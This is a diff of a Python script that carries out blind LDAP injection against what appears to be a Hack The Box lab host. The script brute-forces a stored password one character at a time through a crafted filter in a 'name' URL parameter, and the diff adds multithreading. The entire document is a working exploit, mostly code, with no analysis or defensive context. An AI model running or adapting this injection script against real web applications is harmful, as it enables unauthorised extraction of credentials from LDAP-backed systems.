@@ -1,66 +1,95 @@
 import argparse
 import requests
 import urllib.parse
+import threading
+from queue import Queue
 
-BASE_URL = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
+def worker(base_url, found_chars, q, results, skip_count, add_star, stop_event):
+    while not q.empty() and not stop_event.is_set():
+        char = q.get()
 
-def main(charset_path):
+        if '*' in char and skip_count[0] > 0:
+            skip_count[0] -= 1
+            q.task_done()
+            continue
+
+        if '*' in char and add_star[0]:
+            add_star[0] = False
+            results.put(char)
+            q.task_done()
+            continue
+
+        char_encoded = urllib.parse.quote(char)
+        modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
+
+        try:
+            response = requests.get(modified_url, timeout=5)
+            if "technician" in response.text and response.status_code == 200:
+                results.put(char)
+                break
+        except requests.RequestException as e:
+            print(f"Request failed for character '{char}': {e}")
+        q.task_done()
+
+def main(charset_path, thread_count):
+    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
     found_chars = ""
-    skip_count = 6
-    add_star = True
+    repeat_count = 0
+    last_char = ""
+    max_repeats = 4
+    skip_count = [6]
+    add_star = [True]
+    stop_event = threading.Event()
 
-    try:
-        with open(charset_path, "r") as file:
-            charset = file.read().splitlines()
-    except FileNotFoundError:
-        print(f"Charset file not found: {charset_path}")
-        return
+    with open(charset_path, "r") as file:
+        charset = file.read().splitlines()
 
     try:
         while True:
-            found_new_char = False
+            q = Queue()
+            results = Queue()
             for char in charset:
-                char = char.strip()
-                char_encoded = urllib.parse.quote(char)
+                q.put(char)
 
-                if "*" in char and skip_count > 0:
-                    skip_count -= 1
-                    continue
+            threads = []
+            for _ in range(thread_count):
+                thread = threading.Thread(target=worker, args=(base_url, found_chars, q, results, skip_count, add_star, stop_event))
+                thread.start()
+                threads.append(thread)
 
-                if "*" in char and add_star:
-                    found_chars += char
-                    print(f"Found Character: {char}")
-                    print(f"Current Password: {found_chars}")
-                    add_star = False
-                    continue
+            for thread in threads:
+                thread.join()
 
-                modified_url = BASE_URL.replace("{FUZZ}", char_encoded).replace(
-                    "{found_char}", found_chars
-                )
-
-                try:
-                    response = requests.get(modified_url)
-                    if "technician" in response.text and response.status_code == 200:
-                        found_chars += char
-                        print(f"Found Character ---> {char}")
-                        print(f"Current Password    ---> {found_chars}")
-                        found_new_char = True
+            if not results.empty():
+                found_char = results.get()
+                if found_char == last_char:
+                    repeat_count += 1
+                    if repeat_count >= max_repeats:
+                        # print(f"\nHAPPY HACKING (; ")
                         break
-                except requests.RequestException as e:
-                    print(f"Request failed: {e}")
+                else:
+                    repeat_count = 0
 
-            if not found_new_char:
+                last_char = found_char
+                found_chars += found_char
+                print(f"\rEXTRACTING PASSWORD --> {found_chars}", end="")
+                continue
+
+            if results.empty():
                 break
 
-    except KeyboardInterrupt:
-        print("\n[!] User interruption detected. Exiting...")
-    finally:
-        print(f"Final Password (if found): {found_chars}")
+        print(f"\nFINAL PASSWORD      --> {found_chars}")
 
+    except KeyboardInterrupt:
+        stop_event.set()
+        for thread in threads:
+            thread.join()
+        print(f"last result before you fuck with CTRL + C --> {found_chars}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="LDAP injection fuzzer script for password extraction")
-    parser.add_argument("-c", "--charset", required=True, help="Path to the charset file")
+    parser.add_argument("-c", "--charset", required=True, help="wordlist")
+    parser.add_argument("-t", "--threads", type=int, default=100, help="threads")
     args = parser.parse_args()
 
-    main(args.charset)
+    main(args.charset, args.threads)
